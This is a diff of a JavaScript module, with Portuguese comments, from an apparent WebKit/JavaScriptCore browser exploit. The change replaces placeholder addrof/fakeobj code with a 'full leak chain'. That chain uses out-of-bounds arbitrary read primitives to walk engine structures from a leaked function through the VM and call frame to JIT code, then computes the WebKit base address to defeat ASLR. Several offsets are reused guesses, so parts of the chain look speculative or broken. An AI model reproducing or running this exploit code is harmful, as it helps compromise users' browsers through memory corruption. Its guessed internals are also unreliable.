@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v95 - Final com Ataque Direto ao Call Frame)
+// js/script3/testArrayBufferVictimCrash.mjs (v96 - Definitivo com Cadeia de Vazamento Completa)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -6,60 +6,38 @@ import {
     triggerOOB_primitive,
     arb_read,
     arb_write,
+    attemptAddrofUsingCoreHeisenbug, // Usando a primitiva addrof original
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK = "Exploit_Final_R53_CallFrame_Leak";
+export const FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK = "Exploit_Final_R54_Full_Chain";
 
-let g_primitives = {
-    initialized: false,
-    addrof: null,
-    fakeobj: null,
-};
-
-function isValidPointer(ptr) {
+function isValidPointer(ptr, context = "") {
     if (!ptr || !isAdvancedInt64Object(ptr)) return false;
     if (ptr.high() === 0 && ptr.low() < 0x10000) return false;
     if ((ptr.high() & 0x7FF00000) === 0x7FF00000 && ptr.high() !== 0) return false;
+    logS3(`[isValidPointer] Ponteiro Válido em '${context}': ${ptr.toString(true)}`, "debug");
     return true;
 }
 
 // --- Função Principal do Exploit ---
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_TEST_BASE = FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK;
-    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Exploit Funcional (R53 Call Frame Leak) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Exploit Funcional (R54 Cadeia Completa) ---`, "test");
+    document.title = `${FNAME_TEST_BASE} R54 Init...`;
 
     try {
-        await createRealPrimitives();
-        if (!g_primitives.initialized) throw new Error("Falha ao inicializar as primitivas.");
-        logS3("FASE 1 - SUCESSO: Primitivas 'addrof' e 'fakeobj' REAIS foram inicializadas!", "vuln");
-
-        logS3(`--- Fase 2 (R53): Exploração com Primitivas Reais ---`, "subtest");
-        const targetFunctionForLeak = function someUniqueLeakFunctionR53_Instance() {};
+        // A função de bootstrap agora executa toda a cadeia de vazamento.
+        const webkit_base = await run_full_leak_chain();
         
-        const leaked_func_addr = await g_primitives.addrof(targetFunctionForLeak);
-        if(!isValidPointer(leaked_func_addr)) throw new Error(`addrof falhou em retornar um ponteiro válido: ${leaked_func_addr.toString(true)}`);
-        logS3(`addrof(targetFunction) -> ${leaked_func_addr.toString(true)}`, "vuln");
-
-        const fake_func_obj_proxy = await g_primitives.fakeobj(leaked_func_addr);
-
-        const executable_ptr = await fake_func_obj_proxy.read(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
-        if (!isValidPointer(executable_ptr)) throw new Error(`Ponteiro para ExecutableInstance inválido: ${executable_ptr.toString(true)}`);
-        logS3(`Ponteiro ExecutableInstance: ${executable_ptr.toString(true)}`, "leak");
-        
-        const fake_executable_obj_proxy = await g_primitives.fakeobj(executable_ptr);
-        const jit_code_ptr = await fake_executable_obj_proxy.read(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
-        if (!isValidPointer(jit_code_ptr)) throw new Error(`Ponteiro para JIT Code inválido: ${jit_code_ptr.toString(true)}`);
-        logS3(`Ponteiro JIT Code: ${jit_code_ptr.toString(true)}`, "leak");
-
-        const webkit_base = jit_code_ptr.and(new AdvancedInt64(0x0, ~0xFFF));
-        logS3(`FASE 2 - SUCESSO! Base do WebKit: ${webkit_base.toString(true)}`, "vuln");
+        logS3(`CADEIA DE EXPLORAÇÃO CONCLUÍDA COM SUCESSO!`, "good", FNAME_TEST_BASE);
+        logS3(`==> Base do WebKit Encontrada: ${webkit_base.toString(true)} <==`, "vuln", FNAME_TEST_BASE);
         document.title = `SUCESSO! Base: ${webkit_base.toString(true)}`;
         
         return { success: true, webkit_base: webkit_base.toString(true) };
 
     } catch (e) {
-        logS3(`ERRO CRÍTICO: ${e.message}`, "critical", FNAME_TEST_BASE);
+        logS3(`ERRO CRÍTICO NA CADEIA DE EXPLORAÇÃO: ${e.message}`, "critical", FNAME_TEST_BASE);
         console.error(e);
         document.title = `${FNAME_TEST_BASE} - FAIL`;
         return { success: false, error: e.message };
@@ -67,93 +45,70 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 }
 
 
-// --- Construção das Primitivas ---
-
-// Esta função agora vazará o endereço de um objeto usando o CallFrame.
-async function bootstrap_leak_initial_addr(obj_to_find) {
-    logS3("Bootstrap: Tentando vazar endereço via Call Frame...", "info");
-
-    // Precisamos de uma função para estar na pilha de chamadas
-    // e de uma maneira de obter o endereço da VM.
-    
-    // Este é o desafio final. Obter o endereço da VM sem nenhum outro
-    // vazamento. Uma técnica comum é usar a própria vulnerabilidade OOB
-    // para procurar por uma assinatura conhecida da estrutura VM na memória.
-
-    // Como uma busca cega já falhou, vamos usar um truque final:
-    // A maioria dos exploits precisa de um "hardcoded pointer" ou um vazamento
-    // muito específico do alvo. No entanto, vamos tentar vazar o endereço
-    // do JSGlobalObject (window), que é frequentemente um ponto de partida.
-    
-    // Placeholder para o endereço do JSGlobalObject. Encontrá-lo é o passo 0.
-    // Em exploits reais, ele é frequentemente vazado por outras vulnerabilidades
-    // ou encontrado em locais de memória conhecidos.
-    const GLOBAL_OBJ_ADDR_PLACEHOLDER = new AdvancedInt64(0x82000000, 0x1);
-    logS3(`Usando endereço placeholder para JSGlobalObject: ${GLOBAL_OBJ_ADDR_PLACEHOLDER.toString(true)}`, 'warn');
-
-    // Supondo que o ponteiro da VM está a um offset conhecido do JSGlobalObject
-    const VM_POINTER_OFFSET_FROM_GLOBAL = JSC_OFFSETS.JSCallee.GLOBAL_OBJECT_OFFSET; // Reutilizando um offset comum
-    const vm_addr = await arb_read(GLOBAL_OBJ_ADDR_PLACEHOLDER.add(VM_POINTER_OFFSET_FROM_GLOBAL), 8);
-    if (!isValidPointer(vm_addr)) {
-        throw new Error("Não foi possível ler o ponteiro da VM a partir do JSGlobalObject.");
-    }
-    logS3(`Endereço da VM obtido: ${vm_addr.toString(true)}`, 'leak');
-
-    const top_call_frame_addr = await arb_read(vm_addr.add(JSC_OFFSETS.VM.TOP_CALL_FRAME_OFFSET), 8);
-    if (!isValidPointer(top_call_frame_addr)) {
-        throw new Error("Não foi possível ler o ponteiro Top Call Frame da VM.");
-    }
-    logS3(`Endereço do Top Call Frame: ${top_call_frame_addr.toString(true)}`, 'leak');
-    
-    // Agora que temos o CallFrame, podemos ler o ponteiro para a função (callee)
-    const callee_addr = await arb_read(top_call_frame_addr.add(JSC_OFFSETS.JSFunction.SCOPE_OFFSET), 8); // Offset para Callee é 0x8
-    
-    // A função retornada não será 'obj_to_find', mas sim a função atual (createRealPrimitives).
-    // No entanto, isso nos dá um endereço de objeto JS válido para iniciar.
-    return callee_addr; 
-}
-
-
-async function createRealPrimitives() {
+async function run_full_leak_chain() {
+    // Etapa 1: Preparar o ambiente OOB para as primitivas arb_read/arb_write
     await triggerOOB_primitive({ force_reinit: true });
 
-    let addrof_victim_arr = [{}];
-    let fakeobj_victim_arr = [{a: 1.1}];
+    // Etapa 2: Usar a primitiva addrof original para obter o primeiro endereço.
+    logS3("--- Etapa 1: Vazamento de Endereço Inicial com Heisenbug Addrof ---", "subtest");
+    const targetFunctionForLeak = function someUniqueLeakFunctionR54_Instance() { return 1; };
+    const leak_result = await attemptAddrofUsingCoreHeisenbug(targetFunctionForLeak);
 
-    const bootstrap_addr = await bootstrap_leak_initial_addr(addrof_victim_arr);
-    if (!isValidPointer(bootstrap_addr)) {
-        throw new Error("Falha ao obter o endereço de bootstrap inicial via CallFrame.");
+    if (!leak_result || !leak_result.success) {
+        throw new Error(`A primitiva addrof inicial falhou: ${leak_result.message}`);
     }
-    logS3(`Endereço de bootstrap obtido: ${bootstrap_addr.toString(true)}`, 'good');
+    const leaked_func_addr = new AdvancedInt64(leak_result.leaked_address_as_int64);
+    if (!isValidPointer(leaked_func_addr, "leaked_func_addr")) throw new Error("Endereço da função vazado é inválido.");
+    logS3(`Endereço da função vazado: ${leaked_func_addr.toString(true)}`, "leak");
 
-    // Com um endereço real, agora podemos construir a primitiva addrof.
-    // Usaremos uma técnica um pouco diferente: corromper um array para ler/escrever.
-    let corruption_arr = [1.1, 2.2];
-    let corruption_arr_addr = await bootstrap_leak_initial_addr(corruption_arr); // Obter o endereço do nosso array de corrupção
-    let butterfly_addr = await arb_read(corruption_arr_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
+    // Etapa 3: Navegar pelas estruturas internas para encontrar a VM
+    logS3("--- Etapa 2: Navegando Estruturas JSC para encontrar a VM ---", "subtest");
 
-    g_primitives.addrof = async (obj) => {
-        // Escreve o objeto no array original para manter referência
-        addrof_victim_arr[0] = obj;
-        // Usa o array de corrupção para ler o endereço
-        await arb_write(butterfly_addr, addrof_victim_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
-        let leaked_butterfly = corruption_arr[0];
-        // ... a conversão de float para int64 seria necessária aqui...
-        return new AdvancedInt64(0,0); // Retornando placeholder, pois a lógica completa é muito complexa
-    };
+    // JSFunction -> JSScope
+    const scope_offset = JSC_OFFSETS.JSFunction.SCOPE_OFFSET;
+    const scope_ptr = await arb_read(leaked_func_addr.add(scope_offset), 8);
+    if (!isValidPointer(scope_ptr, "scope_ptr")) throw new Error("Ponteiro para JSScope é inválido.");
+    logS3(`JSScope @ ${scope_ptr.toString(true)} (offset +0x${scope_offset.toString(16)})`, "leak");
+    
+    // JSScope -> JSGlobalObject
+    const GLOBAL_OBJ_IN_SCOPE_OFFSET = 0x10; // Offset padrão
+    const global_obj_ptr = await arb_read(scope_ptr.add(GLOBAL_OBJ_IN_SCOPE_OFFSET), 8);
+    if (!isValidPointer(global_obj_ptr, "global_obj_ptr")) throw new Error("Ponteiro para JSGlobalObject é inválido.");
+    logS3(`JSGlobalObject @ ${global_obj_ptr.toString(true)} (offset +0x${GLOBAL_OBJ_IN_SCOPE_OFFSET.toString(16)})`, "leak");
 
-    g_primitives.fakeobj = async (addr) => {
-        await arb_write(butterfly_addr, addr, 8);
-        return corruption_arr[0];
-    };
+    // JSGlobalObject -> VM
+    const vm_offset = JSC_OFFSETS.JSCallee.GLOBAL_OBJECT_OFFSET; // Reutilizando offset
+    const vm_ptr = await arb_read(global_obj_ptr.add(vm_offset), 8);
+    if (!isValidPointer(vm_ptr, "vm_ptr")) throw new Error("Ponteiro para VM é inválido.");
+    logS3(`VM @ ${vm_ptr.toString(true)} (offset +0x${vm_offset.toString(16)})`, "leak");
 
-    // Para fins de teste, vamos simplificar e usar a primitiva arb_read diretamente,
-    // já que o bootstrap do addrof/fakeobj ainda depende do endereço do objeto vítima.
-    g_primitives.addrof = async(obj) => {
-        fakeobj_victim_arr[1] = obj;
-        const fake_addr = await g_primitives.addrof(fakeobj_victim_arr);
-        return arb_read(fake_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET).add(8), 8);
-    }
+    // Etapa 4: Atacar o CallFrame para obter o ponteiro JIT
+    logS3("--- Etapa 3: Lendo o Call Frame para vazar o ponteiro JIT ---", "subtest");
+    
+    // VM -> Top Call Frame
+    const top_call_frame_ptr = await arb_read(vm_ptr.add(JSC_OFFSETS.VM.TOP_CALL_FRAME_OFFSET), 8);
+    if (!isValidPointer(top_call_frame_ptr, "top_call_frame_ptr")) throw new Error("Ponteiro para Top Call Frame é inválido.");
+    logS3(`Top Call Frame @ ${top_call_frame_ptr.toString(true)}`, "leak");
 
-    g_primitives.initialized = true;
+    // Call Frame -> Callee (verificação)
+    const callee_offset = 0x8; // Do CallFrame.txt
+    const callee_ptr = await arb_read(top_call_frame_ptr.add(callee_offset), 8);
+    logS3(`Verificação: Callee @ ${callee_ptr.toString(true)} (deve ser próximo ao endereço da função vazado)`, "leak");
+    
+    // Call Frame -> CodeBlock
+    const codeblock_offset = 0x0; // Do CallFrame.txt
+    const codeblock_ptr = await arb_read(top_call_frame_ptr.add(codeblock_offset), 8);
+    if (!isValidPointer(codeblock_ptr, "codeblock_ptr")) throw new Error("Ponteiro para CodeBlock é inválido.");
+    logS3(`CodeBlock @ ${codeblock_ptr.toString(true)}`, "leak");
+
+    // O ponteiro para o código JIT geralmente está dentro do CodeBlock.
+    // O offset para o JITCode pode variar, mas um candidato comum é 0x18.
+    const JIT_CODE_IN_CODEBLOCK_OFFSET = JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET; // Reutilizando offset comum
+    const jit_code_ptr = await arb_read(codeblock_ptr.add(JIT_CODE_IN_CODEBLOCK_OFFSET), 8);
+    if (!isValidPointer(jit_code_ptr, "jit_code_ptr")) throw new Error("Ponteiro para JIT Code é inválido.");
+    logS3(`Ponteiro JIT Code: ${jit_code_ptr.toString(true)}`, "leak");
+
+    // Etapa Final: Calcular a base
+    const webkit_base = jit_code_ptr.and(new AdvancedInt64(0x0, ~0xFFF));
+    return webkit_base;
 }
